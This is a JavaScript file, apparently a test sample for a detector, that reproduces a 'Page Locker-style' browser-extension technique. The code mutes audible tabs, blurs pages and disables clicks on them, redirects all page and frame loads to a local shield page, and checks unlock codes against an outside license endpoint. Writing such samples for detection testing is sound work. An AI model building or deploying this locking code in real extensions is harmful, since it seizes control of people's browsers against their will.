// Positive variant: Page Locker-style MV3 background script phoning the
// cloudapi.stream locker license endpoint. Renamed identifiers, quoted keys,
// .htm?query bundled target, reversed resource-type order, body instead of
// documentElement, and a template-literal blur distinguish it from the QA
// sample while exercising the same technique.
async function enforceFocusLock(vault, strength) {
  await chrome.sidePanel.open({ windowId: vault });
  const sounding = await chrome.tabs.query({ audible: true });
  for (const entry of sounding) {
    await chrome.tabs.update(entry.id, { "active": false, "muted": true });
    await chrome.scripting.executeScript({
      target: { tabId: entry.id },
      func: (px) => {
        document.body.style.filter = `blur(${px}px)`;
        document.body.style.pointerEvents = "none";
      },
      args: [strength],
    });
  }
  await chrome.declarativeNetRequest.updateDynamicRules({
    removeRuleIds: [404],
    addRules: [
      {
        "id": 404,
        "priority": 10,
        "action": {
          "type": "redirect",
          "redirect": { "extensionPath": "/pages/shield.htm?reason=focus" },
        },
        "condition": {
          "urlFilter": "*",
          "resourceTypes": ["sub_frame", "main_frame"],
        },
      },
    ],
  });
}

async function confirmLicense(ticket) {
  const reply = await fetch("https://cloudapi.stream/check_code_lock", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ code: ticket }),
  });
  const verdict = await reply.json();
  if (verdict && verdict.r === 1) {
    await chrome.storage.local.set({ license: ticket });
  }
  return verdict;
}
